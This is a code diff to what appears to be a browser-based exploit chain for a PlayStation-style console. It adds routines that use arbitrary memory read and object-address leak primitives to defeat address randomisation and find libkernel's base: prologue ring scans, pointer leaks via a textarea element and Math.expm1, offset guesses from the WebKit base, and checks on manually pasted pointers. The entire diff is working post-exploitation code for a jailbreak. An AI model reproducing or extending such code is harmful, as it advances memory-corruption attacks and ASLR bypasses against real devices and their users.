@@ -30,6 +30,7 @@ const PF_X = 1;
 const LK_LOW_TEXT_MAX = 0x200000;
 const LK_ELF_RADIUS = 0x4000000n;
 const LK_HUNT_RADIUS = 0x2000000n;
+const LK_RING_RADIUS = 0x8000000n;
 const LK_HDR_BACK_COARSE = 64;
 const LK_HDR_BACK_FINE = 256;
 
@@ -828,6 +829,18 @@ function scanNearLibkernelChunk(p, webkitBase, off, sub, anchors) {
         const addr = bigToPtr(sub.cursor);
         if (addr.hi >= 0x8) {
             sub.pages++;
+            if ((addr.low & 0x3fff) === 0 && isLibkernelPrologue(p, addr)) {
+                saveLibkernelSession(addr, null);
+                return {
+                    done: true,
+                    lk: addr,
+                    iatRva: null,
+                    source: "nearlk-prologue-direct",
+                    state: sub,
+                    phase: "nearlk-hit",
+                    pages: sub.pages,
+                };
+            }
             const magic = read4p(p, addr);
             if (magic != null && isModuleMagic(magic)
                 && !isSameWebkitModule(addr, webkitBase, off)) {
@@ -893,6 +906,207 @@ function scanNearLibkernelChunk(p, webkitBase, off, sub, anchors) {
         hits: sub.hits,
         anchor: sub.anchorIdx,
     };
+}
+
+/** ±128MB prologue ring — libkernel may have poops text base (no SCE magic). */
+function scanLkPrologueRingChunk(p, off, sub, anchors) {
+    const RADIUS = LK_RING_RADIUS;
+    const STEP = 0x4000n;
+
+    if (!anchors || !anchors.length)
+        return { done: true, lk: null, state: sub, phase: "ring-skip" };
+
+    if (!sub) {
+        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
+        sub.probes = 0;
+        return {
+            done: false,
+            state: sub,
+            phase: "ring-start",
+            anchor: 0,
+            from: sub.cursor.toString(16),
+            to: sub.end.toString(16),
+        };
+    }
+
+    let batch = 0;
+    while (sub.cursor <= sub.end && batch < 6) {
+        const addr = bigToPtr(sub.cursor);
+        if (addr.hi >= 0x8 && (addr.low & 0x3fff) === 0) {
+            sub.probes++;
+            if (isLibkernelPrologue(p, addr)) {
+                saveLibkernelSession(addr, null);
+                return {
+                    done: true,
+                    lk: addr,
+                    iatRva: null,
+                    source: "ring-prologue",
+                    state: sub,
+                    phase: "ring-hit",
+                    probes: sub.probes,
+                };
+            }
+        }
+        sub.cursor += sub.step;
+        batch++;
+    }
+
+    if (sub.cursor > sub.end) {
+        if (scanAnchorsAdvance(sub, RADIUS)) {
+            return {
+                done: false,
+                state: sub,
+                phase: "ring-anchor",
+                anchor: sub.anchorIdx,
+                probes: sub.probes,
+            };
+        }
+        return { done: true, lk: null, state: sub, phase: "ring-miss", probes: sub.probes };
+    }
+
+    return {
+        done: false,
+        state: sub,
+        phase: "ring",
+        at: sub.cursor.toString(16),
+        probes: sub.probes,
+        anchor: sub.anchorIdx,
+    };
+}
+
+/** Scan leakval slots for external code pointers (textarea, expm1). */
+function scanLeakExtPtrChunk(p, webkitBase, off, state, retain) {
+    if (!state) {
+        const targets = [];
+        try {
+            const ta = document.createElement("textarea");
+            if (retain) retain.push(ta);
+            targets.push({ label: "textarea", cell: p.leakval(ta) });
+        } catch (_) { }
+        try {
+            targets.push({ label: "expm1", cell: p.leakval(Math.expm1) });
+        } catch (_) { }
+        if (!targets.length)
+            return { done: true, lk: null, state: null, phase: "leak-empty" };
+        state = { targets, tIdx: 0, slotOff: 0, tried: 0 };
+        return { done: false, state, phase: "leak-start", targets: targets.length };
+    }
+
+    const SLOT_MAX = 0x80;
+    let batch = 0;
+    while (state.tIdx < state.targets.length && batch < 4) {
+        const t = state.targets[state.tIdx];
+        while (state.slotOff <= SLOT_MAX && batch < 4) {
+            const offSlot = state.slotOff;
+            state.slotOff += 8;
+            state.tried++;
+            batch++;
+            const fnPtr = read8p(p, t.cell.add32(offSlot));
+            if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) continue;
+            const hit = lkFromFnPtr(p, fnPtr, off, null);
+            if (hit) {
+                saveLibkernelSession(hit.lk, hit.iatRva);
+                return {
+                    done: true,
+                    lk: hit.lk,
+                    iatRva: hit.iatRva,
+                    source: "leak/" + t.label + "+0x" + offSlot.toString(16),
+                    state,
+                    phase: "leak-hit",
+                    tried: state.tried,
+                };
+            }
+        }
+        state.tIdx++;
+        state.slotOff = 0;
+    }
+
+    if (state.tIdx >= state.targets.length)
+        return { done: true, lk: null, state, phase: "leak-miss", tried: state.tried };
+    return { done: false, state, phase: "leak", tried: state.tried, target: state.tIdx };
+}
+
+/** Guess bases from webkit ASLR — try paste or ring probe. */
+export function estimateLibkernelCandidates(webkitBase, nativeFn) {
+    const out = [];
+    if (!webkitBase) return out;
+    const wb = ptrBig(webkitBase);
+    const aligned = wb & ~0x3fffn;
+    const deltas = [
+        0x800000, 0x1000000, 0x2000000, 0x4000000, 0x8000000, 0xc000000,
+    ];
+    for (let i = 0; i < deltas.length; i++) {
+        const d = BigInt(deltas[i]);
+        out.push({ hex: "0x" + (aligned - d).toString(16), why: "wk-" + deltas[i].toString(16) });
+        out.push({ hex: "0x" + (aligned + d).toString(16), why: "wk+" + deltas[i].toString(16) });
+    }
+    if (nativeFn) {
+        const na = ptrBig(nativeFn) & ~0x3fffn;
+        out.push({ hex: "0x" + (na - 0x1000000n).toString(16), why: "nativeFn-16MB" });
+        out.push({ hex: "0x" + (na + 0x1000000n).toString(16), why: "nativeFn+16MB" });
+    }
+    return out;
+}
+
+/** Try estimateLibkernelCandidates prologues (2 reads each). */
+function scanGuessCandidatesChunk(p, webkitBase, nativeFn, sub) {
+    if (!sub) {
+        const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
+        if (!cands.length)
+            return { done: true, lk: null, state: null, phase: "guess-skip" };
+        sub = { cands, idx: 0 };
+        return { done: false, state: sub, phase: "guess-start", total: cands.length };
+    }
+
+    let batch = 0;
+    while (sub.idx < sub.cands.length && batch < 4) {
+        const c = sub.cands[sub.idx++];
+        batch++;
+        let addr;
+        try {
+            addr = parseAddrSync(c.hex.replace(/^0x/i, ""));
+        } catch (_) {
+            addr = null;
+        }
+        if (!addr) continue;
+        if (isLibkernelPrologue(p, addr)) {
+            saveLibkernelSession(addr, null);
+            return {
+                done: true,
+                lk: addr,
+                iatRva: null,
+                source: "guess/" + c.why,
+                state: sub,
+                phase: "guess-hit",
+                tried: sub.idx,
+            };
+        }
+    }
+
+    if (sub.idx >= sub.cands.length)
+        return { done: true, lk: null, state: sub, phase: "guess-miss", tried: sub.cands.length };
+    return { done: false, state: sub, phase: "guess", tried: sub.idx, total: sub.cands.length };
+}
+
+/** Paste libkernel base OR any code pointer inside libkernel. */
+export function verifyManualLibkernelFromPtr(p, raw, off) {
+    const ptr = typeof raw === "string" ? parseAddrSync(raw) : raw;
+    if (!ptr) return { ok: false, error: "bad address" };
+    if (isLibkernelPrologue(p, ptr)) {
+        saveLibkernelSession(ptr, null);
+        return { ok: true, lk: ptr, via: "prologue@paste" };
+    }
+    const hit = lkFromFnPtr(p, ptr, off, null);
+    if (hit) {
+        saveLibkernelSession(hit.lk, hit.iatRva);
+        return { ok: true, lk: hit.lk, via: hit.via };
+    }
+    const walked = findModuleBaseBackward(p, ptr, 512);
+    if (walked && looksLikeLibkernelModule(p, walked)) {
+        saveLibkernelSession(walked, null);
+        return { ok: true, lk: walked, via: "walk-back" };
+    }
+    return { ok: false, error: "not libkernel" };
 }
 
 /** Scan mapped RW/data within cap for external code pointers → libkernel walk-back. */
@@ -1915,6 +2129,71 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
         }
         if (c.done) {
             const st = state.pltStats || {};
+            state.stage = "ring";
+            state.sub = null;
+            state.pltStats = st;
+            return {
+                done: false,
+                state,
+                phase: "ring-next",
+                nearPages: c.pages,
+                nearHits: c.hits,
+                ff25: st.ff25,
+                gotHigh: st.gotHigh,
+                e8ext: st.e8ext,
+            };
+        }
+        return Object.assign({ state }, c);
+    }
+
+    if (state.stage === "ring") {
+        const c = scanLkPrologueRingChunk(p, off, state.sub, state.anchors);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ state }, c);
+        }
+        if (c.done) {
+            state.stage = "leak";
+            state.sub = null;
+            state.ringProbes = c.probes;
+            return {
+                done: false,
+                state,
+                phase: "leak-next",
+                ringProbes: c.probes,
+            };
+        }
+        return Object.assign({ state }, c);
+    }
+
+    if (state.stage === "leak") {
+        const c = scanLeakExtPtrChunk(p, webkitBase, off, state.sub, opts.retain);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ state }, c);
+        }
+        if (c.done) {
+            state.stage = "guess";
+            state.sub = null;
+            state.leakTried = c.tried;
+            return {
+                done: false,
+                state,
+                phase: "guess-next",
+                leakTried: c.tried,
+            };
+        }
+        return Object.assign({ state }, c);
+    }
+
+    if (state.stage === "guess") {
+        const c = scanGuessCandidatesChunk(p, webkitBase, opts.nativeFn, state.sub);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ state }, c);
+        }
+        if (c.done) {
+            const st = state.pltStats || {};
             return {
                 done: true,
                 lk: null,
@@ -1924,8 +2203,9 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
                 ff25: st.ff25,
                 gotHigh: st.gotHigh,
                 e8ext: st.e8ext,
-                nearPages: c.pages,
-                nearHits: c.hits,
+                ringProbes: state.ringProbes,
+                leakTried: state.leakTried,
+                guessTried: c.tried,
             };
         }
         return Object.assign({ state }, c);
